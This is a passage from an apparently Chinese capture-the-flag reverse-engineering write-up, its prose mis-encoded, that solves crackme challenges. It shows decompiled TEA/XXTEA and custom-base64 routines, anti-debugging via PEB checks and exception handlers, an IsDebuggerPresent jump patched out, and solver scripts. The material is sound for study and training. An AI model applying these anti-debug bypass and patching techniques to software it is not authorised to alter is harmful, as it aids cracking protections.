v13;</span><br><span class="line">      final_procees = v12;</span><br><span class="line">      add_ = v14;</span><br><span class="line">      origin_data = v15;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      final_procees = v21;</span><br><span class="line">    &#125;</span><br><span class="line">    v21 = final_procees;</span><br><span class="line">    v16 = count_1;</span><br><span class="line">    v18 = add_;</span><br><span class="line">    final_procees[count_1 - <span class="number">1</span>] = origin_data;</span><br><span class="line">    mod_num_2 = <span class="number">0x40</span>;</span><br><span class="line">    LOBYTE(v22[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">    v22[<span class="number">1</span>] = &amp;mod_num_2;</span><br><span class="line">    v22[<span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">    v22[<span class="number">3</span>] = <span class="number">1</span>;</span><br><span class="line">    math_big__Int_Div(a1, a1, v22);</span><br><span class="line">    mod_result_instanc = a1;</span><br><span class="line">    v3 = v21;</span><br><span class="line">    v2 = v18;</span><br><span class="line">  &#125;</span><br><span class="line">  *&amp;result = __PAIR64__(i, v3);</span><br><span class="line">  DWORD2(result) = v2;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ ¸å¿ƒæ˜¯å…¶ä¸­çš„å¤§æ•´å‹å–æ¨¡å’Œå¤§æ•´å‹é™¤æ³• åŠ¨è°ƒå‘ç°å–æ¨¡å’Œé™¤æ³•éƒ½æ˜¯å¯¹ç¬¬ä¸€ä¸ªå‡½æ•°å¾—åˆ°çš„å¤§æ•´å‹è¿›è¡Œ å¦ä¸€ä¸ªæ“ä½œæ•°æ˜¯<code>0x40</code>ä¹Ÿå°±æ˜¯<code>result = big_int &amp; 0xFFFFFF, big_int &gt;&gt; 6</code>ç¬¦åˆä¹‹å‰base64çš„çŒœæµ‹(ä½†æ˜¯ç›´æ¥ç”¨base64è§£å‡ºæ¥ä¸å¯¹ æ‰€ä»¥è‡ªå·±å†™è§£å¯†è„šæœ¬):</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">xor_key = [i ^ <span class="number">0x2f</span> <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">132</span>, <span class="number">14</span>, <span class="number">121</span>, <span class="number">193</span>, <span class="number">41</span>, <span class="number">61</span>, <span class="number">231</span>, <span class="number">134</span>, <span class="number">147</span>, <span class="number">244</span>, <span class="number">180</span>, <span class="number">102</span>, <span class="number">100</span>, <span class="number">175</span>, <span class="number">25</span>, <span class="number">151</span>, <span class="number">133</span>, <span class="number">7</span>, <span class="number">230</span>, <span class="number">74</span>, <span class="number">200</span>, <span class="number">3</span>, <span class="number">55</span>]]</span><br><span class="line">enc = [<span class="string">&quot;8G+cazk2jqb7w01CtoKH4FsrgR3vVmQ9pPhXLAleOd/nB6DfIxMWYiUZ5SEJyNuT&quot;</span>.index(i) <span class="keyword">for</span> i <span class="keyword">in</span><span class="string">&quot;HZ0sMJXqxHgUb2b9RNg+1xw&quot;</span>]</span><br><span class="line">enc = [<span class="built_in">bin</span>(i).replace(<span class="string">&quot;0b&quot;</span>, <span class="string">&quot;&quot;</span>).zfill(<span class="number">6</span>) <span class="keyword">for</span> i <span class="keyword">in</span> enc][::-<span class="number">1</span>]</span><br><span class="line">big_int = <span class="built_in">int</span>(<span class="string">&quot;&quot;</span>.join(enc), <span class="number">2</span>)</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">while</span> big_int &gt; <span class="number">0</span>:</span><br><span class="line">    flag.append(big_int &amp; <span class="number">0xff</span>)</span><br><span class="line">    big_int &gt;&gt;= <span class="number">8</span></span><br><span class="line">flag = flag[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i] ^ xor_key[i]), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment"># go_a_nice_journey</span></span><br></pre></td></tr></table></figure>



<h2 id="not-main-åè°ƒè¯•"><a href="#not-main-åè°ƒè¯•" class="headerlink" title="not main | åè°ƒè¯•"></a>not main | åè°ƒè¯•</h2><p>IDAè¯†åˆ«å‡ºçš„ä¸»å‡½æ•°:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// ecx</span></span><br><span class="line">  __int32 *pt_input1; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">unsigned</span> __int32 now; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> sum; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> __int32 next; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// edi</span></span><br><span class="line">  __int32 *pt_input3; <span class="comment">// ecx</span></span><br><span class="line">  __int32 *v10; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">bool</span> v12; <span class="comment">// cf</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v13; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [esp-4h] [ebp-2Ch]</span></span><br><span class="line">  __int32 *pt_input2; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">  __int128 v18; <span class="comment">// [esp+10h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [esp+20h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  sub_141930(<span class="built_in">std</span>::<span class="built_in">cin</span>);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(enc);</span><br><span class="line">  <span class="keyword">if</span> ( v3 == <span class="number">0x1A</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    pt_input1 = enc;</span><br><span class="line">    pt_input2 = enc;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      now = *pt_input1;</span><br><span class="line">      sum = <span class="number">0</span>;                                  <span class="comment">// TEA</span></span><br><span class="line">      next = pt_input1[<span class="number">1</span>];</span><br><span class="line">      v8 = <span class="number">32</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        sum -= <span class="number">0x61C88647</span>;</span><br><span class="line">        now += ((next &gt;&gt; <span class="number">5</span>) + <span class="number">97</span>) ^ (<span class="number">16</span> * next + <span class="number">102</span>) ^ (sum + next);</span><br><span class="line">        next += ((now &gt;&gt; <span class="number">5</span>) + <span class="number">101</span>) ^ (<span class="number">16</span> * now + <span class="number">107</span>) ^ (sum + now);</span><br><span class="line">        --v8;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v8 );</span><br><span class="line">      *pt_input2 = now;</span><br><span class="line">      pt_input2[<span class="number">1</span>] = next;</span><br><span class="line">      pt_input1 = pt_input2 + <span class="number">2</span>;</span><br><span class="line">      pt_input2 = pt_input1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( pt_input1 &lt; &amp;debug_flag_1 );</span><br><span class="line">    pt_input3 = enc;</span><br><span class="line">    v10 = to_cmp;</span><br><span class="line">    v11 = <span class="number">28</span>;</span><br><span class="line">    <span class="keyword">while</span> ( *pt_input3 == *v10 )</span><br><span class="line">    &#123;</span><br><span class="line">      ++pt_input3;</span><br><span class="line">      ++v10;</span><br><span class="line">      v12 = v11 &lt; <span class="number">4</span>;</span><br><span class="line">      v11 -= <span class="number">4</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v12 )</span><br><span class="line">      &#123;</span><br><span class="line">        v18 = xmmword_143220;</span><br><span class="line">        LOBYTE(v19) = <span class="number">19</span>;</span><br><span class="line">        v13 = <span class="number">0</span>;</span><br><span class="line">        v3 = <span class="built_in">strlen</span>(&amp;v18);</span><br><span class="line">        <span class="keyword">if</span> ( v3 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">            *(&amp;v18 + v13++) ^= <span class="number">0x13</span>u;</span><br><span class="line">          <span class="keyword">while</span> ( v13 &lt; &amp;v18 + <span class="built_in">strlen</span>(&amp;v18) + <span class="number">1</span> - (&amp;v18 + <span class="number">1</span>) );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">LABEL_11:                                       <span class="comment">// fail</span></span><br><span class="line">    v14 = sub_141600(v3, sub_141830);</span><br><span class="line">    <span class="built_in">std</span>::ostream::operator&lt;&lt;(v14, v16);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åŒ…å«ä¸€ä¸ªTEA ä½†æ˜¯è§£å‡ºæ¥æ˜¯å‡flag <code>while ( pt_input1 &lt; &amp;debug_flag_1 );</code>è¿™ä¸€è¡Œå¯¹flagäº¤å‰å¼•ç”¨åˆ°è¾¾ä¸€ä¸ªå¼‚å¸¸å¤„ç†å‡½æ•°:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_141010</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint8_t</span> BeingDebugged; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  BeingDebugged = NtCurrentPeb()-&gt;BeingDebugged;</span><br><span class="line">  debug_flag_1 = BeingDebugged != <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( BeingDebugged )</span><br><span class="line">    AddVectoredExceptionHandler(<span class="number">1u</span>, Handler);</span><br><span class="line">  <span class="keyword">return</span> atexit(sub_142AE0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Handler</code>åº”è¯¥å°±æ˜¯ç¨‹åºæ­£å¸¸è¿è¡Œè¿‡ç¨‹ä¸­ä¸»å‡½æ•°è§¦å‘å¼‚å¸¸åæ‰§è¡Œçš„å¤„ç†å‡½æ•°:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LONG __userpurge Handler@&lt;eax&gt;(<span class="type">int</span> a1@&lt;edi&gt;, <span class="keyword">struct</span> _EXCEPTION_POINTERS *ExceptionInfo)</span><br><span class="line">&#123;</span><br><span class="line">  DWORD ExceptionCode; <span class="comment">// eax</span></span><br><span class="line">  PCONTEXT ContextRecord; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> sum; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> __int32 temp; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">bool</span> v9; <span class="comment">// zf</span></span><br><span class="line">  _DWORD *real_enc; <span class="comment">// edx</span></span><br><span class="line">  __int32 *v11; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v12; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">bool</span> v13; <span class="comment">// cf</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> j; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [esp-10h] [ebp-44h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> addr_13503C; <span class="comment">// [esp+4h] [ebp-30h]</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [esp+8h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// [esp+Ch] [ebp-28h]</span></span><br><span class="line">  <span class="type">int</span> temp_2; <span class="comment">// [esp+10h] [ebp-24h]</span></span><br><span class="line">  <span class="type">int</span> key[<span class="number">4</span>]; <span class="comment">// [esp+14h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v23[<span class="number">3</span>]; <span class="comment">// [esp+24h] [ebp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  ExceptionCode = ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode;</span><br><span class="line">  <span class="keyword">if</span> ( ExceptionCode == <span class="number">-2147483645</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ContextRecord = ExceptionInfo-&gt;ContextRecord;</span><br><span class="line">    dword_145038 = <span class="number">0</span>;</span><br><span class="line">    ++ContextRecord-&gt;Eip;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( ExceptionCode == <span class="number">0xC0000094</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    key[<span class="number">0</span>] = <span class="number">116</span>;</span><br><span class="line">    addr_13503C = to_cmp ^ ::addr_13503C;</span><br><span class="line">    sum = <span class="number">0</span>;</span><br><span class="line">    ::addr_13503C ^= to_cmp;</span><br><span class="line">    temp = enc_7_;</span><br><span class="line">    key[<span class="number">1</span>] = <span class="number">114</span>;</span><br><span class="line">    key[<span class="number">2</span>] = <span class="number">117</span>;</span><br><span class="line">    key[<span class="number">3</span>] = <span class="number">101</span>;</span><br><span class="line">    v19 = <span class="number">12</span>;</span><br><span class="line">    temp_2 = enc_7_;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v20 = sum - <span class="number">0x61C88647</span>;</span><br><span class="line">      v7 = ((sum - <span class="number">0x61C88647</span>) &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">7</span>; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        enc[i] += ((v20 ^ enc_1_[i]) + (temp_2 ^ key[v7 ^ i &amp; <span class="number">3</span>])) ^ (((<span class="number">16</span> * temp_2) ^ (enc_1_[i] &gt;&gt; <span class="number">3</span>))</span><br><span class="line">                                                                    + ((temp &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * enc_1_[i])));</span><br><span class="line">        temp = enc[i];</span><br><span class="line">        temp_2 = temp;</span><br><span class="line">      &#125;</span><br><span class="line">      sum -= <span class="number">0x61C88647</span>;</span><br><span class="line">      temp = (((v20 ^ enc[<span class="number">0</span>]) + (temp ^ key[v7 ^ i &amp; <span class="number">3</span>])) ^ (((<span class="number">16</span> * temp) ^ (enc[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>)) + ((temp &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * enc[<span class="number">0</span>]))))</span><br><span class="line">           + enc_7_;</span><br><span class="line">      v9 = v19-- == <span class="number">1</span>;</span><br><span class="line">      temp_2 = temp;</span><br><span class="line">      enc_7_ = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !v9 );</span><br><span class="line">    real_enc = addr_13503C;</span><br><span class="line">    v11 = enc;</span><br><span class="line">    v12 = <span class="number">28</span>;</span><br><span class="line">    <span class="keyword">while</span> ( *v11 == *real_enc )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v11;</span><br><span class="line">      ++real_enc;</span><br><span class="line">      v13 = v12 &lt; <span class="number">4</span>;</span><br><span class="line">      v12 -= <span class="number">4</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v13 )</span><br><span class="line">      &#123;</span><br><span class="line">        v23[<span class="number">0</span>] = <span class="number">862354538</span>;</span><br><span class="line">        v23[<span class="number">1</span>] = <span class="number">862418548</span>;</span><br><span class="line">        v23[<span class="number">2</span>] = <span class="number">322070394</span>;</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(v23); ++j )</span><br><span class="line">          *(v23 + j) ^= <span class="number">0x13</span>u;</span><br><span class="line">        v15 = sub_141600(sub_141830, a1);</span><br><span class="line">        <span class="built_in">std</span>::ostream::operator&lt;&lt;(v15, v16);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ExceptionInfo-&gt;ContextRecord-&gt;Ecx = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åŒ…å«ä¸€ä¸ªXXTEAåŠ å¯† keygen:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> delta = <span class="number">0x61C88647</span>;</span><br><span class="line"><span class="type">unsigned</span> __int32 enc[] = &#123;</span><br><span class="line">    <span class="number">0xCFBE0F1B</span>, <span class="number">0x5F3083F</span>, <span class="number">0x4220E43B</span>, <span class="number">0x3383AFEE</span>, <span class="number">0xFA3237CE</span>, <span class="number">0xECADA66E</span>, <span class="number">0xA8D47CA7</span>, <span class="number">0xEFC51077</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> key[<span class="number">4</span>] = &#123;<span class="number">116</span>, <span class="number">114</span>, <span class="number">117</span>, <span class="number">101</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//TEA decrypt</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">11</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> sum = <span class="number">-12</span> * <span class="number">0x61C88647</span>;</span><br><span class="line">    <span class="type">int</span> delta = <span class="number">0x61C88647</span>;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="type">int</span> j = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        enc[<span class="number">7</span>] -= (((sum ^ enc[<span class="number">0</span>]) + (enc[<span class="number">6</span>] ^ key[j ^ <span class="number">7</span> &amp; <span class="number">3</span>])) ^ (((<span class="number">16</span> * enc[<span class="number">6</span>]) ^ (enc[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>)) + ((enc[<span class="number">6</span>] &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * enc[<span class="number">0</span>]))));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">6</span>; i &gt;= <span class="number">1</span>; i--)&#123;</span><br><span class="line">            enc[i] -= (((sum ^ enc[i + <span class="number">1</span>]) + (enc[i - <span class="number">1</span>] ^ key[j ^ i &amp; <span class="number">3</span>])) ^ (((<span class="number">16</span> * enc[i - <span class="number">1</span>]) ^ (enc[i + <span class="number">1</span>] &gt;&gt; <span class="number">3</span>)) + ((enc[i - <span class="number">1</span>] &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * enc[i + <span class="number">1</span>]))));</span><br><span class="line">        &#125;</span><br><span class="line">        enc[<span class="number">0</span>] -= (((sum ^ enc[<span class="number">1</span>]) + (enc[<span class="number">7</span>] ^ key[j ^ <span class="number">0</span> &amp; <span class="number">3</span>])) ^ (((<span class="number">16</span> * enc[<span class="number">7</span>]) ^ (enc[<span class="number">1</span>] &gt;&gt; <span class="number">3</span>)) + ((enc[<span class="number">7</span>] &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * enc[<span class="number">1</span>]))));</span><br><span class="line">        sum += delta;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">while</span>(count--);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i += <span class="number">2</span>)&#123;</span><br><span class="line">        sum = <span class="number">-32</span> * <span class="number">0x61C88647</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> _ = <span class="number">0</span>; _ &lt; <span class="number">32</span>; _++)&#123;</span><br><span class="line">            enc[i + <span class="number">1</span>] -= ((enc[i] &gt;&gt; <span class="number">5</span>) + <span class="number">101</span>) ^ (<span class="number">16</span> * enc[i] + <span class="number">107</span>) ^ (sum + enc[i]);</span><br><span class="line">            enc[i] -= ((enc[i + <span class="number">1</span>] &gt;&gt; <span class="number">5</span>) + <span class="number">97</span>) ^ (<span class="number">16</span> * enc[i + <span class="number">1</span>] + <span class="number">102</span>) ^ (sum + enc[i + <span class="number">1</span>]);</span><br><span class="line">            sum += delta;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (enc[i] &gt;&gt; (<span class="number">8</span> * j)) &amp; <span class="number">0xff</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// begin&#123;not_main_is_matter!&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="å‡ºé¢˜äººçš„å¯†ç æ˜¯ä»€ä¹ˆ-ä¸çŸ¥é“ä»€ä¹ˆåŠ å¯†-æ··æ·†"><a href="#å‡ºé¢˜äººçš„å¯†ç æ˜¯ä»€ä¹ˆ-ä¸çŸ¥é“ä»€ä¹ˆåŠ å¯†-æ··æ·†" class="headerlink" title="å‡ºé¢˜äººçš„å¯†ç æ˜¯ä»€ä¹ˆ | ä¸çŸ¥é“ä»€ä¹ˆåŠ å¯† | æ··æ·†"></a>å‡ºé¢˜äººçš„å¯†ç æ˜¯ä»€ä¹ˆ | ä¸çŸ¥é“ä»€ä¹ˆåŠ å¯† | æ··æ·†</h2><p>æœ€åçš„æ¯”è¾ƒå‡½æ•°:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-110639-2.png" alt="image-20240206142249939"></p>
<p>çœ‹èµ·æ¥æ˜¯å¯¹æ§åˆ¶æµè¿›è¡Œäº†æ··æ·† å…ˆçŒœæµ‹å°±æ˜¯æŒ‰é¡ºåºä¸€ä¸ªä¸€ä¸ªå¯¹æ¯” ä¸»å‡½æ•°å¼€å¤´å°±åŠ äº†åè°ƒè¯•:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00AC8540 8B F4                         mov     esi, esp</span><br><span class="line">.text:00AC8542 FF 15 00 C0 B3 00             call    ds:IsDebuggerPresent</span><br><span class="line">.text:00AC8542</span><br><span class="line">.text:00AC8548 3B F4                         cmp     esi, esp</span><br><span class="line">.text:00AC854A E8 6E AA FF FF                call    j___RTC_CheckEsp</span><br><span class="line">.text:00AC854A</span><br><span class="line">.text:00AC854F 85 C0                         test    eax, eax</span><br><span class="line">.text:00AC8551 75 11                         jnz     short loc_AC8564                ; Keypatch modified this from:</span><br><span class="line">.text:00AC8551                                                                       ;   jz short loc_438564</span><br><span class="line">.text:00AC8551                                                                       ; Keypatch modified this from:</span><br><span class="line">.text:00AC8551                                                                       ;   jz short loc_D38564</span><br><span class="line">.text:00AC8551</span><br><span class="line">.text:00AC8553 8B F4                         mov     esi, esp</span><br><span class="line">.text:00AC8555 6A 00                         push    0                               ; uExitCode</span><br><span class="line">.text:00AC8557 FF 15 08 C0 B3 00             call    ds:ExitProcess</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œpatchæ‰ æ¥ä¸‹æ¥è¾“å…¥å®Œflagåæœ‰å¾ˆå¤šæ— ç”¨å‡½æ•°å¹²æ‰°åˆ†æ æ²¡ç”¨çš„å‡½æ•°æ ‡è®°ä¸€ä¸‹ åœ¨å”¯ä¸€ä¸€ä¸ªæœ‰ç”¨çš„åˆ†æ”¯æ‰¾åˆ°ä¸¤ä¸ªåŠ å¯†å‡½æ•°:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">j__gets_s(passw, <span class="number">0x64</span>u);</span><br><span class="line">fzwufunc();</span><br><span class="line">fzwufunc2();</span><br><span class="line">j_fzwu();</span><br><span class="line">fzwufunc();</span><br><span class="line">sub_AC125D();</span><br><span class="line">j_fzwu__();</span><br><span class="line">...</span><br><span class="line"><span class="type">int</span> <span class="title function_">sub_D78120</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __CheckForDebuggerJustMyCode(byte_B3D0F4);</span><br><span class="line">  j_procees_func1();</span><br><span class="line">  j_procees_func2();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒä¸ªåŠ å¯†å‡½æ•°:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">procees_func2</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+D0h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  result = __CheckForDebuggerJustMyCode(&amp;byte_B3D0F4);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">48</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    final_[i] = (passw[i] + <span class="number">5</span>) ^ <span class="number">0x25</span>;</span><br><span class="line">    result = i + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯¹ç¬¬ä¸€ä¸ªå‡½æ•°åŠ å¯†åçš„æ•°æ®è¿›è¡ŒåŠ æ³•å’Œå¼‚æˆ–</p>
<p>ç¬¬ä¸€ä¸ªåŠ å¯†å‡½æ•°:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">procees_func1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  __int64 v2; <span class="comment">// [esp+D0h] [ebp-58h]</span></span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// [esp+ECh] [ebp-3Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+F8h] [ebp-30h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+104h] [ebp-24h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [esp+110h] [ebp-18h]</span></span><br><span class="line">  <span class="type">char</span> *v7; <span class="comment">// [esp+120h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(byte_B3D0F4);</span><br><span class="line">  v3 = j__strlen(user);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    j__srand(byte_B39FD7[v3]);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    j__srand(<span class="number">0x123456</span>u);</span><br><span class="line">  v0 = j__rand() % <span class="number">7</span>;                           <span class="comment">// v0 = 7</span></span><br><span class="line">  result = dword_B39000[<span class="number">2</span> * v0];</span><br><span class="line">  LODWORD(v2) = result;</span><br><span class="line">  HIDWORD(v2) = dword_B39004[<span class="number">2</span> * v0];           <span class="comment">// v2 = 0x33077D</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = &amp;passw[<span class="number">8</span> * i];</span><br><span class="line">    v6 = *v7;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">64</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v6 &lt; <span class="number">0</span> )</span><br><span class="line">        v6 = v2 ^ (<span class="number">2</span> * v6);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v6 *= <span class="number">2</span>i64;</span><br><span class="line">    &#125;</span><br><span class="line">    *v7 = v6;</span><br><span class="line">    result = i + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

